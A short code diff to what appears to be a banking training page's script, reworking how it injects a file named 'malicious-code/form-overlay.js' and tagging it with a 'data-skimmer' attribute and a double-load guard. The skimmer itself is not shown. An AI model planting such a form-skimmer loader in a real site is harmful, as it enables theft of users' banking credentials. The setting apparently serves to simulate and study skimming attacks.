@@ -940,7 +940,11 @@
     initFormProcessor()
   }
   // ===== Injection for form-overlay.js =====
-  const overlayScript = document.createElement('script')
-  overlayScript.src =  '../malicious-code/form-overlay.js'
-  document.body.appendChild(overlayScript)
+  // Guard against double-loading (banking-train.html used to also include a static tag).
+  if (!document.querySelector('script[data-skimmer="form-overlay"]')) {
+    const overlayScript = document.createElement('script')
+    overlayScript.src = new URL('malicious-code/form-overlay.js', document.baseURI).toString()
+    overlayScript.setAttribute('data-skimmer', 'form-overlay')
+    document.body.appendChild(overlayScript)
+  }
 })()
